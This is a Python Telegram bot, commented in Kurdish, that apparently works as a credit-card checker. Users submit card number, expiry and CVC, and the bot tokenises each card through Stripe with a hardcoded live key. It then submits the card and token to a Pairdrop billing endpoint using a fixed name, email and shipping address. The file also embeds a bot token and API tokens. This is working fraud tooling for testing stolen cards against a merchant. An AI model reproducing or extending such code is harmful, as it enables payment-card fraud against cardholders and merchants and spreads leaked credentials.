import telebot
import requests
import re

# ڕێکخستنەکان
TOKEN = '7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI'
STRIPE_API = 'https://api.stripe.com/v1/tokens'
PAIRDROP_API = 'https://api.pairdrop.com/api/userservicebilling/'
STRIPE_KEY = 'pk_live_wQf9xVndaHc2rb640vDWtzvK00KqIMTv5I'  # پێویستە بگۆڕیت بە keyـەکەی خۆت

bot = telebot.TeleBot(TOKEN)

def check_card_format(message):
    # پشکنینی فۆڕماتەکانی کارت
    pattern1 = r'^\d{16}\|\d{2}\|\d{2}\|\d{3}$'  # 4831380058036495|04|27|737
    pattern2 = r'^\d{16}\|\d{2}\|\d{4}\|\d{3}$'  # 4831380058036495|04|2027|737
    
    return bool(re.match(pattern1, message.text) or bool(re.match(pattern2, message.text))

def extract_card_info(message):
    # جیاکردنەوەی زانیارییەکانی کارت
    parts = message.text.split('|')
    return {
        'number': parts[0],
        'exp_month': parts[1],
        'exp_year': parts[2] if len(parts[2]) == 4 else '20' + parts[2],
        'cvc': parts[3]
    }

def check_with_stripe(card_info):
    # پشکنین بە Stripe API
    headers = {
        'Host': 'api.stripe.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': f'Bearer {STRIPE_KEY}'
    }
    
    data = {
        'card[number]': card_info['number'],
        'card[exp_month]': card_info['exp_month'],
        'card[exp_year]': card_info['exp_year'],
        'card[cvc]': card_info['cvc'],
        'card[currency]': 'USD'
    }
    
    try:
        response = requests.post(STRIPE_API, headers=headers, data=data)
        return response.json()
    except Exception as e:
        print(f"هەڵە لە Stripe API: {e}")
        return None

def send_to_pairdrop(card_info, stripe_token):
    # ناردن بۆ Pairdrop API
    headers = {
        'Host': 'api.pairdrop.com',
        'Content-Type': 'application/json',
        'Authorization': 'Token c8a369e46815140459542592fd3580c762eb484f'  # پێویستە بگۆڕیت
    }
    
    payload = {
        "collage_id": "85731",
        "billing": {
            "email": "Peshangdev@gmail.com",
            "card_info": {
                "card_number": card_info['number'],
                "name": "JohnDoe",
                "expire_month": card_info['exp_month'],
                "expire_year": card_info['exp_year']
            },
            "stripe_token": stripe_token
        },
        "box_fee": "1",
        "shipping": {
            "phone": "3144740104",
            "address": "198WhiteHorsePike",
            "city": "Collingswood",
            "email": "Peshangdev@gmail.com",
            "zip": "08107",
            "recipient": "JohnDoe",
            "state": "NEWJERSEY"
        }
    }
    
    try:
        response = requests.post(PAIRDROP_API, headers=headers, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"هەڵە لە Pairdrop API: {e}")
        return False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    instructions = """
سڵاو! بۆتێکی پشکنینی کارتی کرێدیتە.

ناردنی زانیاری کارت بە یەکێک لەم شێوازانە:

4831380058036495|04|27|737
یان
4831380058036495|04|2027|737
"""
    bot.reply_to(message, instructions)

@bot.message_handler(func=lambda message: True)
def handle_card(message):
    if not check_card_format(message):
        return
    
    card_info = extract_card_info(message)
    bot.send_message(message.chat.id, "🔍 پشکنینی کارت...")
    
    # پشکنین بە Stripe
    stripe_result = check_with_stripe(card_info)
    
    if stripe_result and 'id' in stripe_result:
        # ناردن بۆ Pairdrop
        send_to_pairdrop(card_info, stripe_result['id'])
    else:
        print("پشکنین سەرنەکەوت")

bot.infinity_polling()
